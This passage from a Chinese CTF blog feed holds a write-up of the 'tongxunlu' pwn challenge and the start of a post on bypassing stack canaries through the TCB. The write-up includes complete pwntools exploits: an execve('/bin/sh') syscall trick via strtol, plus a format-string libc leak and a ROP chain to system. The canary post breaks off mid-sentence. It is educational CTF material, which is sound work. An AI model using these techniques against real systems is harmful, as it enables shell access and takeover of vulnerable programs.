而是存放0x4048d8</p><p><a href="https://pic.imgdb.cn/item/63f391c8f144a0100727b6a3.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f391c8f144a0100727b6a3.png"></a></p><p>这个疑点目前以我的动调水平还看不出来是啥问题 留着以后探讨吧 不过这次复现真的提升很大</p><p>对于栈迁移更加熟悉了 特别是学会了利用pop rbp的方法来栈迁移  不得不说和猫神这样的大牛子差距真的太大了</p><h2 id="tongxunlu"><a href="#tongxunlu" class="headerlink" title="tongxunlu"></a>tongxunlu</h2><p>考的就是一个函数的返回值在寄存器存放中的知识点</p><p>在这题之前我们先来看一个小程序</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调式exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,26248)</span></span><br><span class="line">io = process(<span class="string">&quot;./a.out&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&quot;./locate&quot;)</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x8</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b *$rebase(0x72C)&#x27;</span>)</span><br><span class="line">pause()</span><br><span class="line">io.send(payload)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure><p>将断点打在call read之后 随后我们来看一下寄存器的值</p><p><a href="https://pic.imgdb.cn/item/63f2fbf7f144a010072b05b8.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f2fbf7f144a010072b05b8.png"></a></p><p>可以看到此时rax寄存器的值是0x8  正是我们通过read输入的数据的字节数 而read函数的返回值则等于接收到的字节数</p><p>同理 我们来试一下strtol函数 即本题的关键漏洞函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> a[<span class="number">20</span>];</span><br><span class="line">    <span class="type">long</span> <span class="type">int</span> b;</span><br><span class="line">    read(<span class="number">0</span>,a,<span class="number">0x30</span>);</span><br><span class="line">    b= strtol(a,<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,26248)</span></span><br><span class="line">io = process(<span class="string">&quot;./a.out&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#elf = ELF(&quot;./pwn&quot;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)</span></span><br><span class="line"><span class="comment">#libc = ELF(&quot;./locate&quot;)</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;11&#x27;</span>+<span class="string">b&#x27;aaaaaaaa&#x27;</span></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b *$rebase(0x77D)&#x27;</span>)</span><br><span class="line">pause(<span class="number">0</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/63f30003f144a010072fab38.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f30003f144a010072fab38.png"></a></p><p>可以看到11是被rax寄存器存储  aaaaaaaa 被rdi寄存器存储</p><p>strtol函数一共需要三个参数 </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">long</span> <span class="type">int</span> <span class="title function_">strtol</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str, <span class="type">char</span> **endptr, <span class="type">int</span> base)</span></span><br></pre></td></tr></table></figure><p>str字符串提供要经过转化的字符串 endptr用来存放剩余字符串 base用来指定转化的进制 就**strtol(a,0,10)**举例</p><p>我们给定的进制为10进制 那么其只会接收0-9的字符  如果检测到了不属于这个范围的 则会停止接收  比如读入了两个11后 检测到了a 则停止接收 使返回值为11</p><p>而接下来剩余的字符串 会一直接收到识别到\x00 即字符串的结束 将其放入到endptr中 在这个程序中的表现就是被放入到rdi寄存器存储</p><p><strong>上述的一切程序编译环境是Ubuntu18.04  更换libc为libc-2.31.so</strong> </p><p>说回vn的这一题</p><p>保护机制</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)</span><br><span class="line">[*] &#x27;/home/chen/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RUNPATH:  &#x27;/home/chen/glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/&#x27;</span><br></pre></td></tr></table></figure><p>再来看一下反汇编后的代码</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init_buf(argc, argv, envp);</span><br><span class="line">  eeee_wantboy();</span><br><span class="line">  hao_kang_de();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>三个函数 init_buf用来清空缓存区</p><p>来看剩下两个</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">eeee_wantboy</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">36</span>]; <span class="comment">// [rsp+100h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+128h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+12Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;halo little giegie,my name is eeee,i am 11111&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;can i get your phone number&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;if you give me your number,i will give you some hao_kang_de&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;i get you ! little giegie&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;heyhey , hao_kang_de is %lx \n&quot;</span>, v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;anything want to say?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v1, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> strtol(buf, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有一个栈溢出漏洞 但是只够覆盖rbp和retaddr 不过前面一题是栈迁移 应该不会两题都考</p><p>还有一次往v1输入数据的机会 不过没有栈溢出 也覆盖不到buf</p><p>最后是调用了strtol函数 联想到我们上面做的小实验 所以这里我们可以控制rax和rdi寄存器的值</p><p>接着看下一个函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hao_kang_de</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wait!! i will give you something&quot;</span>);</span><br><span class="line">  v0 = sys_write(<span class="number">0</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;hhhh~i just tell a joke&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>转化成汇编形式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:000000000000087B                 push    rbp</span><br><span class="line">.text:000000000000087C                 mov     rbp, rsp</span><br><span class="line">.text:000000000000087F                 lea     rdi, s          ; &quot;wait!! i will give you something&quot;</span><br><span class="line">.text:0000000000000886                 call    _puts</span><br><span class="line">.text:000000000000088B                 mov     rax, 1</span><br><span class="line">.text:0000000000000892                 mov     rdi, 0          ; fd</span><br><span class="line">.text:0000000000000899                 mov     rsi, 0          ; buf</span><br><span class="line">.text:00000000000008A0                 mov     rdx, 0          ; count</span><br><span class="line">.text:00000000000008A7                 syscall                 ; LINUX - sys_write</span><br><span class="line">.text:00000000000008A9                 lea     rdi, aHhhhIJustTellA ; &quot;hhhh~i just tell a joke&quot;</span><br><span class="line">.text:00000000000008B0                 call    _puts</span><br><span class="line">.text:00000000000008B5                 nop</span><br><span class="line">.text:00000000000008B6                 pop     rbp</span><br><span class="line">.text:00000000000008B7                 retn</span><br></pre></td></tr></table></figure><p>是采用syscall的方法调用的write  联想到我们可以修改rax和rdi 所以这里可以直接partical write的方法跳转到0x899这里 进行系统调用</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    io=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;if you give me your number,i will give you some hao_kang_de&quot;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;59&#x27;</span>+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload += cyclic(<span class="number">0x2e</span>)+p16(<span class="number">0x899</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;anything want to say?&quot;</span>)</span><br><span class="line">    payload = p64(<span class="number">0</span>)</span><br><span class="line">    <span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x976)&#x27;)</span></span><br><span class="line">    <span class="comment"># pause(0)</span></span><br><span class="line">    io.send(payload)</span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line">    io.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">    result = io.recv(timeout=<span class="number">1</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    try_count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exploit()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            try_count += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;failed :&#123;&#125;&quot;</span>.<span class="built_in">format</span>(try_count))</span><br></pre></td></tr></table></figure><p>这题还看到其他师傅有比较新奇的思路 用的是格式化字符串泄露libc基址 试着跟着复现了一下 感觉收获还是很多的</p><p>因为这题开启了PIE 所以没有办法利用第一个栈溢出到处跑 只能说试着爆破最后两个字节或者是覆盖最后一个字节来做到同页内迁移</p><p>正常情况下eeee_wantboy函数的返回地址是</p><p><a href="https://pic.imgdb.cn/item/63f351def144a01007a5196a.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f351def144a01007a5196a.png"></a></p><p>如果我们只覆盖最后一个字节就可以做到同页内的迁移 可以跳转到0x555555554900 - 0x555555554a00的任意地址</p><p>也就是eeee_wantboy函数的一部分和main函数</p><p>原本的程序执行顺序是先read再提供栈的地址 通过跳转的办法我们就可以获得栈地址后再考虑如何构造rop链</p><p>同时你要注意到read函数的rsi参数是根据rbp的地址来寻找的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0000000000000943                 lea     rax, [rbp+var_130]</span><br><span class="line">.text:000000000000094A                 mov     edx, 100h       ; nbytes</span><br><span class="line">.text:000000000000094F                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000000952                 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000000957                 call    _read</span><br></pre></td></tr></table></figure><p>如果用垃圾数据覆盖rbp 就丢失了这次read的机会</p><p>这里把漏洞点放到没有指定任何参数 而是单独输出字符串的printf函数上面 我们只需要控制rdi寄存器就可以触发格式化字符串漏洞</p><p>这里也是借助strtol函数的特性来操控rdi寄存器</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;if you give me your number,i will give you some hao_kang_de&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)+p8(<span class="number">0x79</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;heyhey , hao_kang_de is &quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;stack_addr :&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;anything want to say?&quot;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;chen&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;if you give me your number,i will give you some hao_kang_de&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%7$p|%11$p&#x27;</span>.ljust(<span class="number">0x30</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack_addr+<span class="number">0x218</span>)+p8(<span class="number">0x12</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;anything want to say?&quot;</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;b *$rebase(0x912)&#x27;</span>)</span><br><span class="line">pause(<span class="number">0</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;chen&#x27;</span>)</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/63f35606f144a01007aad4d2.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f35606f144a01007aad4d2.png"></a></p><p>这里的rbp之所以用stack_addr+0x218覆盖 也是为了使得第二次执行eeee函数时的read的rsi参数正确 我们预想的是直接写到rsp处 这样在执行read指令时 其内部存在的ret指令就可以将rop链的首部弹出到rip 控制程序执行流</p><p>这个偏移并不是唯一的 可以自己更换数值多动调 按我下面的办法</p><p><a href="https://pic.imgdb.cn/item/63f358c2f144a01007ae68f1.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f358c2f144a01007ae68f1.png"></a></p><p>此时rsp是指向0x7ffc8d148b50处 而我们的rbp设置成了stack_addr+0x218 为0x7ffc8d148c28</p><p>所以read读入的地址是rbp-0x130 也就是0x7ffc8d148af8</p><p>此时s进入call read指令</p><p><a href="https://pic.imgdb.cn/item/63f35904f144a01007aebf74.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63f35904f144a01007aebf74.png"></a></p><p>当其执行到ret准备执行下一个指令时的rsp指针指向0x7ffc8d148b48</p><p>所以我们read需要填充的垃圾数据就是0x7ffc8d148b48-0x7ffc8d148af8&#x3D;0x50</p><p>另外执行system的时候还需要注意栈对齐</p><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;if you give me your number,i will give you some hao_kang_de&quot;</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x38</span>)+p8(<span class="number">0x79</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;heyhey , hao_kang_de is &quot;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;stack_addr :&quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">io.recvuntil(<span class="string">&quot;anything want to say?&quot;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;chen&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;if you give me your number,i will give you some hao_kang_de&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%7$p|%11$p&#x27;</span>.ljust(<span class="number">0x30</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack_addr+<span class="number">0x218</span>)+p8(<span class="number">0x12</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;anything want to say?&quot;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x912)&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(<span class="string">b&#x27;chen&#x27;</span>)</span><br><span class="line">libc_start_main_addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">&quot;|&quot;</span>,drop = <span class="literal">True</span>),<span class="number">16</span>)-<span class="number">243</span></span><br><span class="line">success(<span class="string">&quot;libc_start_main_addr :&quot;</span>+<span class="built_in">hex</span>(libc_start_main_addr))</span><br><span class="line">elf_base = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x978</span></span><br><span class="line">success(<span class="string">&quot;elf_base :&quot;</span>+<span class="built_in">hex</span>(elf_base))</span><br><span class="line">libc_addr = libc_start_main_addr - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_addr :&quot;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = libc_addr + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">rdi_addr = elf_base + <span class="number">0x0000000000000a13</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;anything want to say?&quot;</span>)</span><br><span class="line">ret_addr = elf_base + <span class="number">0x000000000000069e</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span>+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>修改TCB来绕过canary</title>
      <link href="/2023/02/17/%E4%BF%AE%E6%94%B9TCB%E6%9D%A5%E7%BB%95%E8%BF%87canary/"/>
      <url>/2023/02/17/%E4%BF%AE%E6%94%B9TCB%E6%9D%A5%E7%BB%95%E8%BF%87canary/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>以往做过的开启了canary保护的题目 一般都是通过格式化字符串泄露 从而来绕过canary 最近在学习免杀的时候 意外了解了canary的生成机制 从而就有了今天的这一篇文章 总体下来还是收获颇丰</p><h2 id="什么是canary"><a href="#什么是canary" class="headerlink" title="什么是canary"></a>什么是canary</h2><p>由于c语言并没有检查数组的下标 所以其存在溢出的可能性 诱发了栈溢出漏洞 可以使得攻击者任意的控制程序执行流 对此 canary机制有效预防了栈溢出的操作</p><p>其通过在栈帧的bp寄存器间隔一个字长(往低地址方向)的地方存放了一串随机数(末位为\x00 目的是防止被printf等函数泄露)</p><p>在函数结束前 进行了一个异或检查 如果发现此地址处的canary被修改了 那么则判定为发生了栈溢出的行为</p><p>则会跳转到**___stack_chk_fail**函数 该函数负责输出错误信息并且终止程序</p><p><a href="https://pic.imgdb.cn/item/63ef7c53f144a01007eed48d.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63ef7c53f144a01007eed48d.png"></a></p><p>函数栈帧在形成初期 从 <strong>fs:0x28</strong> 赋值 并将其入栈</p><p><a href="https://pic.imgdb.cn/item/63ef7c37f144a01007ee9d2f.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63ef7c37f144a01007ee9d2f.png"></a></p><p>函数结束前进行异或判定 如果结尾为0 就通过jz指令跳转到 <strong>leave|ret</strong> 指令处返回父栈帧</p><p><a href="https://pic.imgdb.cn/item/63ef7d80f144a01007f11c4f.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63ef7d80f144a01007f11c4f.png"></a></p><p>否则就调用**___stack_chk_fail**函数结束程序</p><p>而在libc2.23及以下的版本中 <strong>___stack_chk_fail</strong>函数会根据argv[0]存放的程序路径来输出下面这样的错误信息</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> a[<span class="number">0x20</span>];</span><br><span class="line">    read(<span class="number">0</span>,a,<span class="number">0x30</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/63ef7e1cf144a01007f2865a.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63ef7e1cf144a01007f2865a.png"></a></p><p>而argv[0]位于当前栈帧的栈底 可以通过溢出篡改其为flag 从而获取flag</p><p><a href="https://pic.imgdb.cn/item/63ef7e9df144a01007f3c751.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63ef7e9df144a01007f3c751.png"></a></p><p>这里直接在源码中修改argv[0] 看看效果</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc,<span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">    <span class="type">char</span> a[<span class="number">20</span>];</span><br><span class="line">    argv[<span class="number">0</span>]=<span class="string">&quot;hello,world&quot;</span>;</span><br><span class="line">    read(<span class="number">0</span>,a,<span class="number">0x30</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/63ef83b4f144a01007030076.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63ef83b4f144a01007030076.png"></a></p><p>不过 要注意的是 其输出的是路径 也就是字符串 而非输出该路径对应文件的内容</p><p>接着我们更换一下libc 文件 使其为libc2.27再次尝试 源码不变</p><p><a href="https://pic.imgdb.cn/item/63ef8475f144a0100704d4ef.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63ef8475f144a0100704d4ef.png"></a></p><p>可以发现其直接默认输出unknown了</p><p>同时这里发现了一个有趣的现象 到达一定长度后 溢出的数据会被当作指令执行 这就需要进一步研究了</p><p><a href="https://pic.imgdb.cn/item/63ef84b1f144a010070561f2.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63ef84b1f144a010070561f2.png"></a></p><p>不过由于我实在是太心急把这篇文章写出来 所以暂时是先咕咕了 后续会开一个新篇章研究这个现象</p><p>上述稍微跑题了一下  说回canary  栈上的canary是由 <strong>fs:28h</strong> 处提供的值 我们对这个地址朔源一下</p><p>fs是一个寄存器 其指向当前活动线程的TEB结构</p><p>TEB是一个线程环境块   进程中每个线程都对应着一个TEB结构体 其存储了线程的各种信息</p><p>不同的偏移对应着不同的信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">000 指向SEH链指针</span><br><span class="line">004 线程堆栈顶部</span><br><span class="line">008 线程堆栈底部</span><br><span class="line">00C SubSystemTib</span><br><span class="line">010 FiberData</span><br><span class="line">014 ArbitraryUserPointer</span><br><span class="line">018 FS段寄存器在内存中的镜像地址</span><br><span class="line">020 进程PID</span><br><span class="line">024 线程ID</span><br><span class="line">02C 指向线程局部存储指针</span><br><span class="line">030 PEB结构地址（进程结构）</span><br><span class="line">034 上个错误号</span><br></pre></td></tr></table></figure><p>但是fs中存放的TEB地址需要经过解析之后才能显示</p><p><a href="https://pic.imgdb.cn/item/63ef918df144a0100724afdf.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63ef918df144a0100724afdf.png"></a></p><p>调用<strong>pthread_self</strong>函数就可以获取到TEB的位置</p><p><a href="https://pic.imgdb.cn/item/63ef91e6f144a01007254e12.png" class="gallery-item"><img src="https://pic.imgdb.cn/item/63ef91e6f144a01007254e12.png"></a></p><p>可以在对应位置找到canary 而canary判断是否被更改 是将栈上的和这里的进行比较</p><p>如果我们修改了TEB上的canary  那么栈上的canary就可以很轻易的被我们绕过</p><p>那么TEB上的canary又是从何而来呢  